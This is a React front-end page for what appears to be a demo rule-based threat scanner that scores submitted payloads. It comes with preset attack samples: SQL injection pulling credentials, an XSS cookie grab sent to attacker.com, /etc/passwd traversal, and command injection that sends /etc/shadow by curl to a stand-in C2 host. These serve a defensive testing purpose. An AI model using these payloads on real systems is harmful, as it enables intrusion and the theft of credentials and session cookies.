import React, { useState } from 'react';
import { 
  Cpu, 
  Search, 
  ShieldAlert, 
  CheckCircle, 
  AlertTriangle, 
  Code2, 
  Terminal, 
  Zap, 
  Sparkles,
  ArrowRight
} from 'lucide-react';
import { ThreatBadge } from '../components/ThreatBadge';
import { api } from '../services/api';

export function ThreatAnalysisPage({ onThreatDetected }) {
  const [payload, setPayload] = useState("' UNION SELECT 1, username, password FROM users WHERE admin=1 --");
  const [sourceIp, setSourceIp] = useState("198.51.100.22");
  const [requestRate, setRequestRate] = useState(24);
  const [analyzing, setAnalyzing] = useState(false);
  const [analysisResult, setAnalysisResult] = useState(null);
  const [error, setError] = useState(null);

  const samplePayloads = [
    {
      name: "SQL Injection Probe",
      payload: "' UNION SELECT 1, username, password_hash, email FROM admin_credentials --",
      ip: "198.51.100.89",
      rate: 15
    },
    {
      name: "Cross-Site Scripting (XSS)",
      payload: "<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>",
      ip: "103.145.22.11",
      rate: 8
    },
    {
      name: "Directory Traversal / LFI",
      payload: "../../../../etc/passwd",
      ip: "185.220.101.44",
      rate: 12
    },
    {
      name: "Remote Command Execution",
      payload: "; cat /etc/shadow | curl -X POST -d @- http://c2-listener.net",
      ip: "45.142.195.12",
      rate: 45
    },
    {
      name: "Benign User Search Query",
      payload: "GET /api/v1/products?category=cybersecurity_hardware&sort=desc",
      ip: "192.168.1.55",
      rate: 10
    }
  ];

  const handleAnalyze = async () => {
    if (!payload.trim()) return;
    setAnalyzing(true);
    setError(null);
    try {
      const res = await api.analyzePayload(payload, sourceIp, requestRate, true);
      setAnalysisResult(res);
      if (onThreatDetected && res.threat_score >= 25) {
        onThreatDetected(res);
      }
    } catch (err) {
      console.error('Analysis failed:', err);
      setError('Analysis failed: ' + (err.message || 'FastAPI backend connection error'));
    } finally {
      setAnalyzing(false);
    }
  };

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="p-5 rounded-2xl bg-gradient-to-r from-slate-900/90 via-[#0d1629] to-slate-900/90 border border-slate-800 glass-panel shadow-xl">
        <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
          <div>
            <div className="flex items-center gap-2">
              <Cpu className="w-5 h-5 text-purple-400 animate-pulse" />
              <h1 className="text-xl sm:text-2xl font-black text-white tracking-tight">
                Defensive Heuristic Threat Scanner
              </h1>
              <span className="px-2 py-0.5 rounded-full text-[10px] font-mono font-bold bg-purple-500/15 text-purple-400 border border-purple-500/30">
                RULE-BASED DEFENSE
              </span>
            </div>
            <p className="text-xs sm:text-sm text-slate-400 mt-1 max-w-3xl">
              Inspect arbitrary payloads, injection strings, HTTP queries, and request patterns. 
              The defensive rule engine evaluates signatures, calculates a 0–100 threat score, and generates mitigation playbooks.
            </p>
          </div>

          <div className="p-3 rounded-xl bg-amber-500/10 border border-amber-500/30 text-xs text-amber-300 font-mono flex items-center gap-2 shrink-0">
            <AlertTriangle className="w-4 h-4 text-amber-400 shrink-0" />
            <span>DEMO SIMULATION — Defensive Rule-Based Detection</span>
          </div>
        </div>
      </div>

      {/* Preset Test Payloads */}
      <div className="space-y-2">
        <span className="text-xs font-mono text-slate-400 uppercase tracking-wider block">
          One-Click Test Attack Signatures:
        </span>
        <div className="flex flex-wrap gap-2">
          {samplePayloads.map((sample, idx) => (
            <button
              key={idx}
              onClick={() => {
                setPayload(sample.payload);
                setSourceIp(sample.ip);
                setRequestRate(sample.rate);
              }}
              className="px-3 py-1.5 rounded-xl bg-slate-900 hover:bg-slate-800 border border-slate-800 hover:border-purple-500/40 text-xs text-slate-300 hover:text-white transition flex items-center gap-1.5"
            >
              <Zap className="w-3.5 h-3.5 text-purple-400" />
              <span>{sample.name}</span>
            </button>
          ))}
        </div>
      </div>

      {error && (
        <div className="p-4 rounded-xl bg-red-500/15 border border-red-500/40 text-red-300 text-xs flex items-center gap-2">
          <AlertTriangle className="w-4 h-4 shrink-0" />
          <span>{error}</span>
        </div>
      )}

      {/* Analysis Interface */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        {/* Input Form */}
        <div className="p-5 rounded-2xl bg-[#0d1527] border border-slate-800 glass-panel shadow-xl space-y-4">
          <div className="flex items-center justify-between border-b border-slate-800 pb-3">
            <h3 className="font-bold text-sm text-white flex items-center gap-2">
              <Code2 className="w-4 h-4 text-cyan-400" />
              Target Payload & Request Context
            </h3>
            <span className="text-xs text-slate-400 font-mono">Deep Inspection</span>
          </div>

          <div className="space-y-3 text-xs">
            <div>
              <label className="block text-slate-300 font-mono mb-1">
                Raw Input / HTTP Request / Query Payload
              </label>
              <textarea
                rows={5}
                value={payload}
                onChange={(e) => setPayload(e.target.value)}
                placeholder="Paste SQL string, script tag, command sequence, or benign URL..."
                className="w-full p-3 rounded-xl bg-slate-950 border border-slate-800 text-cyan-300 font-mono text-xs focus:border-cyan-500 focus:outline-none"
              />
            </div>

            <div className="grid grid-cols-2 gap-3">
              <div>
                <label className="block text-slate-300 font-mono mb-1">Client Source IP</label>
                <input
                  type="text"
                  value={sourceIp}
                  onChange={(e) => setSourceIp(e.target.value)}
                  className="w-full p-2.5 rounded-xl bg-slate-950 border border-slate-800 text-white font-mono focus:border-cyan-500 focus:outline-none"
                />
              </div>

              <div>
                <label className="block text-slate-300 font-mono mb-1">
                  Request Rate ({requestRate} req/min)
                </label>
                <input
                  type="number"
                  value={requestRate}
                  onChange={(e) => setRequestRate(parseInt(e.target.value) || 0)}
                  className="w-full p-2.5 rounded-xl bg-slate-950 border border-slate-800 text-white font-mono focus:border-cyan-500 focus:outline-none"
                />
              </div>
            </div>
          </div>

          <button
            onClick={handleAnalyze}
            disabled={analyzing}
            className="w-full py-3.5 px-4 rounded-xl bg-gradient-to-r from-purple-600 via-indigo-600 to-blue-600 hover:from-purple-500 hover:to-blue-500 text-white font-bold text-xs uppercase tracking-wider flex items-center justify-center gap-2 shadow-lg shadow-purple-500/20 active:scale-95 transition"
          >
            {analyzing ? (
              <>
                <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin" />
                <span>Scanning Rules & Signatures...</span>
              </>
            ) : (
              <>
                <Sparkles className="w-4 h-4" />
                <span>Execute Deep Threat Analysis</span>
              </>
            )}
          </button>
        </div>

        {/* Results Card */}
        <div className="p-5 rounded-2xl bg-[#0d1527] border border-slate-800 glass-panel shadow-xl flex flex-col justify-between">
          <div>
            <div className="flex items-center justify-between border-b border-slate-800 pb-3 mb-4">
              <h3 className="font-bold text-sm text-white flex items-center gap-2">
                <Terminal className="w-4 h-4 text-purple-400" />
                Defensive Analysis Verdict
              </h3>
              {analysisResult && (
                <ThreatBadge severity={analysisResult.severity} score={analysisResult.threat_score} size="md" />
              )}
            </div>

            {analysisResult ? (
              <div className="space-y-4 text-xs">
                {/* Score Gauge */}
                <div className="p-4 rounded-xl bg-slate-900/80 border border-slate-800 space-y-2">
                  <div className="flex items-center justify-between">
                    <span className="font-semibold text-slate-300">Calculated Threat Score</span>
                    <span className="font-mono text-lg font-bold text-white">
                      {analysisResult.threat_score} / 100
                    </span>
                  </div>

                  <div className="w-full bg-slate-950 h-3 rounded-full overflow-hidden p-0.5 border border-slate-800">
                    <div
                      className={`h-full rounded-full transition-all duration-700 ${
                        analysisResult.threat_score >= 75 ? 'bg-gradient-to-r from-red-600 to-rose-500' :
                        analysisResult.threat_score >= 50 ? 'bg-gradient-to-r from-orange-500 to-amber-500' :
                        analysisResult.threat_score >= 25 ? 'bg-gradient-to-r from-amber-400 to-yellow-300' :
                        'bg-gradient-to-r from-cyan-500 to-emerald-400'
                      }`}
                      style={{ width: `${analysisResult.threat_score}%` }}
                    />
                  </div>

                  <div className="flex justify-between text-[10px] font-mono text-slate-400 pt-1">
                    <span>0: Low</span>
                    <span>25: Medium</span>
                    <span>50: High</span>
                    <span>75–100: Critical</span>
                  </div>
                </div>

                {/* Reason */}
                <div className="p-3.5 rounded-xl bg-slate-950/80 border border-slate-800 space-y-1">
                  <span className="text-[10px] font-mono text-cyan-400 uppercase font-bold">
                    Detection Reason & Matched Heuristics
                  </span>
                  <p className="text-slate-200 leading-relaxed font-sans">{analysisResult.detection_reason}</p>
                </div>

                {/* Mitigation */}
                <div className="p-3.5 rounded-xl bg-emerald-950/20 border border-emerald-500/30 space-y-1">
                  <span className="text-[10px] font-mono text-emerald-400 uppercase font-bold flex items-center gap-1.5">
                    <CheckCircle className="w-3.5 h-3.5" />
                    Recommended Defensive Action
                  </span>
                  <p className="text-emerald-200 leading-relaxed font-sans">{analysisResult.recommended_action}</p>
                </div>

                {analysisResult.matched_rules?.length > 0 && (
                  <div className="space-y-1.5">
                    <span className="text-[10px] font-mono text-slate-400 uppercase">Triggered Rules</span>
                    <div className="flex flex-wrap gap-1.5">
                      {analysisResult.matched_rules.map((rule, idx) => (
                        <span key={idx} className="px-2 py-1 rounded-md bg-purple-500/10 border border-purple-500/30 text-purple-300 font-mono text-[11px]">
                          {rule}
                        </span>
                      ))}
                    </div>
                  </div>
                )}
              </div>
            ) : (
              <div className="h-64 flex flex-col items-center justify-center text-center text-slate-400 space-y-2">
                <Search className="w-8 h-8 text-slate-600" />
                <p className="text-sm font-semibold text-slate-300">Scanner Ready</p>
                <p className="text-xs text-slate-400 max-w-xs">
                  Enter an input or select a preset sample on the left, then click "Execute Deep Threat Analysis".
                </p>
              </div>
            )}
          </div>

          <div className="pt-3 border-t border-slate-800 text-[10px] text-slate-400 font-mono text-center">
            DEMO SIMULATION — Defensive Rule-Based Detection
          </div>
        </div>
      </div>
    </div>
  );
}
